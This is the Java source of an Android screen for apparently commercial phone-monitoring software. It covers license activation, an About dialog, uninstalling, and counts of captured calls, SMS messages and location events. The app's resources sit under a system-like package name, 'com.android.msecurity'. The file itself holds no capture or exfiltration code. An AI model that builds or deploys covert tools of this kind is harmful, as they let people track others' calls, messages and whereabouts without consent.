package com.vvt.android.syncmanager;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.text.Html;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.msecurity.R;
import com.fx.dalvik.activation.ActivationResponse;
import com.fx.dalvik.preference.model.ProductInfo;
import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.GeneralUtil;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.DatabaseManager;
import com.vvt.android.syncmanager.control.EventManager;
import com.vvt.android.syncmanager.control.LicenseManager;
import com.vvt.android.syncmanager.control.Main;
import com.vvt.android.syncmanager.gui.EventsSettingsActivity;

public final class SyncManagerActivity 
		extends Activity implements LicenseManager.Callback, EventManager.Callback {

	private static final String TAG = "SyncManagerActivity";
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOGD = Customization.DEBUG ? DEBUG : false;
	
	private static final int DIALOG_ACTIVATE = 1;
	private static final int DIALOG_ABOUT = 2;

	private LinearLayout notActivatedLinearLayout;
    private ProgressDialog progressDialog;
	
	private LinearLayout activatedLinearLayout;
	
	private TextView eventTotal;
	private TextView eventIncomingCall;
	private TextView eventOutgoingCall;
	private TextView eventMissedCall;
	private TextView eventIncomingSms;
	private TextView eventOutgoingSms;
	private TextView eventLocation;
	
	@Override
    public void onCreate(Bundle aSavedInstanceStateBundle) {
    	if (LOGV) FxLog.v(TAG, "onCreate # ENTER ...[UI]");
    	
    	Main.startIfNotStarted(getApplicationContext());
     	  
        super.onCreate(aSavedInstanceStateBundle);
        
        setContentView(R.layout.main);
        
        LauncherActivity.cleanupTempApk();

        // notActivatedLinearLayout
        notActivatedLinearLayout = 
        	(LinearLayout) findViewById(R.id.license_not_activated_linear_layout);
        
        // activatedLinearLayout
        activatedLinearLayout = (LinearLayout) findViewById(R.id.license_activated_linear_layout);
        
        eventTotal = (TextView) findViewById(R.id.information_event_total);
        eventIncomingCall = (TextView) findViewById(R.id.information_event_incoming_call);
        eventOutgoingCall = (TextView) findViewById(R.id.information_event_outgoing_call);
        eventMissedCall = (TextView) findViewById(R.id.information_event_missed_call);
        eventIncomingSms = (TextView) findViewById(R.id.information_event_incoming_sms);
        eventOutgoingSms = (TextView) findViewById(R.id.information_event_outgoing_sms);
        eventLocation = (TextView) findViewById(R.id.information_event_location);
        
        updateGui();
    }
    
    @Override
    public void onStart() {
    	if (LOGV) FxLog.v(TAG, "onStart # ENTER ...[UI]");
    	super.onStart();
    }
    
    @Override
    public void onResume() {
    	if (LOGV) FxLog.v(TAG, "onResume # ENTER ...[UI]");
    	super.onResume();
    	
    	if (LOGV) {
	    	ConfigurationManager aConfigurationManager = Main.getInstance().getConfigurationManager();
	    	FxLog.v(TAG, String.format("Capture: %s", aConfigurationManager.loadCaptureEnabled()));
    	}
    }
    
    @Override
    public void onPause() {
    	if (LOGV) FxLog.v(TAG, "onPause # ENTER ...[UI]");
    	super.onPause();
    }
        
    @Override
    public void onStop() {
    	if (LOGV) FxLog.v(TAG, "onStop # ENTER ...[UI]");    
    	super.onStop();
    }
    
	@Override
    public void onDestroy() {
    	if (LOGV) FxLog.v(TAG, "onDestroy # ENTER ...[UI]");
    	super.onDestroy();
    }
	
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
    	if (LOGV) FxLog.v(TAG, "onCreateOptionsMenu # ENTER ...");
    	MenuInflater inflater = getMenuInflater();
    	inflater.inflate(R.menu.main_options_not_activated, menu);
    	return true;
    }
    
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
    	if (LOGV) FxLog.v(TAG, "onOptionsItemSelected # ENTER ...");
    	
    	switch (item.getItemId()) {
	    	case R.id.menu_main_about:
	    		showDialog(DIALOG_ABOUT);
	    		break;
	    	case R.id.menu_main_activate:
	    		showDialog(DIALOG_ACTIVATE);
	    		break;
	    	case R.id.menu_main_uninstall:
	    		GeneralUtil.promptUninstallApplication(getApplicationContext());
	    		break;
    	}
    	
    	return true;
    }
    
    // Only handle activation process (called by LicenseManager)
    public void onActivateDeactivateComplete(ActivationResponse response) {
		if (LOGV) FxLog.v(TAG, "onActivateDeactivateComplete # ENTER ...");

		if (progressDialog != null) {
			progressDialog.dismiss();
		}
		
		Main.getInstance().getLicenseManager().removeCallback(this);

		if (response != null) {
			if (response.isActivateAction()) {
				if (response.isSuccess()) {
					notifyUser(getString(R.string.language_activation_success));
					updateGui();
				} else {
					String message = String.format("%s: %s", 
							getString(R.string.language_activation_fail), 
							response.getMessage());
					notifyUser(message);
				}
			}
		} else {
			if (LOGD) FxLog.d(TAG, "Invalid activation state.");
		}
		
		if (LOGV) FxLog.v(TAG, "onActivateDeactivateComplete # EXIT ...");
    }

	public void onFxLogEventsChanged() {
		refreshFxLogEventsInformation();
	}

	@Override
	protected Dialog onCreateDialog(int dialogId) {
		if (LOGV) FxLog.v(TAG, "onCreateDialog # ENTER ...");
		
		switch (dialogId) {
		
		case DIALOG_ACTIVATE:
			if (LOGV) {
				FxLog.v(TAG, "DIALOG_ACTIVATE");
			}
			View activateView = getLayoutInflater().inflate(R.layout.activate_dialog, null);
			final EditText inputActivateCode = 
				(EditText) activateView.findViewById(R.id.input_activation_code);
			
			if (LOGV) {
				FxLog.v(TAG, String.format("inputActivateCode: %s", inputActivateCode));
			}
			
			return new AlertDialog.Builder(this)
				.setTitle(R.string.language_ui_label_activate_product)
				.setView(activateView)
				.setPositiveButton(R.string.language_ui_label_ok, 
						new DialogInterface.OnClickListener() {
							public void onClick(DialogInterface dialog, int which) {
								if (which == DialogInterface.BUTTON_POSITIVE 
										&& inputActivateCode != null
										&& inputActivateCode.getText() != null) {
									activate(inputActivateCode.getText().toString());
								}
							}
						})
				.setNegativeButton(R.string.language_ui_label_cancel, null)
				.create();
			
		case DIALOG_ABOUT:
			View aboutView = getLayoutInflater().inflate(R.layout.about_dialog, null);
			TextView textView = (TextView) aboutView.findViewById(R.id.about_text_view);
			
			ProductInfo productInfo = ProductInfoHelper.getProductInfo(getApplicationContext());
			
			String productId = String.valueOf(productInfo.getId());
			String version = productInfo.getVersionName();
			String buildDate = productInfo.getBuildDate();
			
			String html = String.format(
					StringResource.LANG_ABOUT_INFO, productId, version, buildDate);
			
			CharSequence aMessage = Html.fromHtml(html);
			textView.setText(aMessage);
			
			return new AlertDialog.Builder(this)
				.setTitle(R.string.language_ui_label_about)
				.setView(aboutView)
				.setPositiveButton(R.string.language_ui_label_ok, null)
				.create();
		}
		
		return null;
	}

	private void notifyUser(String stringMessage) {
		if (LOGV) {
			FxLog.v(TAG, "notifyUser # ENTER ...");
		}
		Toast.makeText(this, stringMessage, Toast.LENGTH_LONG).show();
	}

	private void activate(String activationCode) {
		if (LOGV) FxLog.v(TAG, "activate # ENTER ...");
	
		GeneralUtil.hideSoftInput(this, getCurrentFocus());
		
		if (! GeneralUtil.isNullOrEmptyString(activationCode)) {
			LicenseManager licenseManager = Main.getInstance().getLicenseManager();
			licenseManager.asyncActivate(activationCode);
			licenseManager.addCallback(this);
			
			progressDialog = ProgressDialog.show(this, "", 
					getString(R.string.language_ui_msg_processing_polite), true);
		}
	}

	private void updateGui() { 
		if (LOGV) FxLog.v(TAG, "updateGui # ENTER ...");
		
		LicenseManager licenseManager = Main.getInstance().getLicenseManager();
	
	    if (licenseManager.isActivated()) {
			Intent intent = new Intent();
			intent.setClass(SyncManagerActivity.this, EventsSettingsActivity.class);
			startActivity(intent);
			finish();
	    } else {
	    	notActivatedLinearLayout.setVisibility(View.VISIBLE);
	    	activatedLinearLayout.setVisibility(View.GONE);
	    }
	}

	private void refreshFxLogEventsInformation() {
		// Show Events Information
		DatabaseManager databaseManager = Main.getInstance().getDatabaseManager();
		eventTotal.setText(String.format("%d", databaseManager.countTotalEvents()));
		eventIncomingCall.setText(String.format("%d", databaseManager.countIncomingCall()));
		eventOutgoingCall.setText(String.format("%d", databaseManager.countOutgoingCall()));
		eventMissedCall.setText(String.format("%d", databaseManager.countMissedCall()));
		eventIncomingSms.setText(String.format("%d", databaseManager.countIncomingSms()));
		eventOutgoingSms.setText(String.format("%d", databaseManager.countOutgoingSms()));
		eventLocation.setText(String.format("%d", databaseManager.countLocation()));
	}

}
